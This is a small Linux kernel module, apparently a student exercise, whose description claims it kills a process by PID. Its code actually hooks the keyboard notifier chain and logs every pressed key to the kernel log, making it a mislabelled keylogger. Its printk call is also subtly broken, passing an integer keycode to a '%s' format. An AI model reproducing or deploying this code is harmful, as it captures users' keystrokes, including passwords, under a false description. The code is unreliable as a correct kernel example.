#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>

#define DRIVER_AUTHOR "grupo 3"
#define DRIVER_DESC   "Kills a given process by its PID"
#define DRIVER_LICENSE "GPL"

int killer_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
        if(param->down)
        {
            printk(KERN_INFO "%s \n", param->value);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block killer_nb =
{
    .notifier_call = killer_notify
};


static int __init init_killer(void)
{
    register_keyboard_notifier(&killer_nb);
    return 0;
}

static void __exit cleanup_killer(void)
{
    unregister_keyboard_notifier(&killer_nb);
}

module_init(init_killer);
module_exit(cleanup_killer);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
